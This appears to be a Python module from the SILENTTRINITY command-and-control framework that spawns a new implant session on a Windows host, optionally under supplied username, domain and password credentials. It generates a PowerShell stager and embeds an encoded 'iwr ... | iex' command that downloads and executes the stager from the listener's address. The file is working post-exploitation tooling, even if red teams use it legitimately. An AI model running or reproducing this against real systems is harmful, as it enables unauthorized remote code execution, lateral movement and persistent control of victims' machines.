from silenttrinity.core.teamserver.module import Module
from silenttrinity.core.events import Events
from silenttrinity.core.teamserver import ipc_server
from silenttrinity.core.teamserver.utils import powershell_encode
from silenttrinity.core.utils import print_bad, get_path_in_package

class STModule(Module):
    def __init__(self):
        self.name = 'boo/session_shell'
        self.language = 'boo'
        self.description = 'Runs a new session with the credentials provided'
        self.author = 'ilan'
        self.references = []
        self.options = {
            'Listener': {
                'Description': 'Listener to use',
                'Required': True,
                'Value': ''
            },
            'Username': {
                'Description'   :   'Optional alternative username to execute ShellCommand as',
                'Required'      :   False,
                'Value'         :   ""
            },
            'Domain': {
                'Description'   :   'Optional alternative Domain of the username to execute ShellCommand as',
                'Required'      :   False,
                'Value'         :   ""
            },
            'Password': {
                'Description'   :   'Optional password to authenticate the username to execute the ShellCommand as',
                'Required'      :   False,
                'Value'         :   ""
            }
        }

    def payload(self):
        stager = ipc_server.publish_event(Events.GET_STAGERS, ('powershell',))
        listener = ipc_server.publish_event(Events.GET_LISTENERS, (self.options['Listener']['Value'],))

        if stager and listener:
            stager.options['AsFunction']['Value'] = False
            with open(get_path_in_package('core/teamserver/modules/boo/src/shell.boo'), 'r') as module_src:
                guid, psk, stage = stager.generate(listener)
                ipc_server.publish_event(Events.SESSION_REGISTER, (guid, psk))
                with open(f'stagers/{guid}', 'wb') as stager:
                    stager.write(stage.encode('latin-1'))
                src = module_src.read()
                # Assuming the server is hosting a web server at BindIP/stagers !!
                execute_command = f"iwr('{listener['BindIP']}/{guid}') -UseBasicParsing|iex"
                src = src.replace("COMMAND_TO_RUN", f'powershell -e {powershell_encode(execute_command)}')
                src = src.replace("PATH",  r"C:\Windows\System32")
                src = src.replace("USERNAME", self.options['Username']['Value'])
                src = src.replace("DOMAIN", self.options['Domain']['Value'])
                src = src.replace("PASSWORD", self.options['Password']['Value'])
                return src
        else:
            print_bad(f"Listener '{self.options['Listener']['Value']}' not found!")


